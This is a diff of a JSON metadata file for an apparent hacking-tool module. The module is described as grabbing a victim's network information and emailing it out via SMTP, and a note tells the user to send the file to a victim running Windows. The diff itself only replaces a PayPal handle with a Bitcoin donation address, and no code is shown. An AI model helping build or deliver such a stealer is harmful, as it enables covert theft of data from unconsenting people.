@@ -6,6 +6,5 @@
   "Description" : "This module is used to grab all the network information of victims computer once executed successfullyIt will send all the information via ptovided mail service",
   "Parameters" : ["port" , "smtp" , "email" , "password"],
   "Note" : ["You have to send this file to the victim running Windows. Executing it on yourself is not worth.","Run this tool as root to avoid errors." , "Set all parameters carefully"],
-  "Paypal" : "@maazwaheed123"
-
+  "BTC" : "bc1qsmuuhkph59qwv4q87p2w4lzudysym72vjqjfa8"
 }
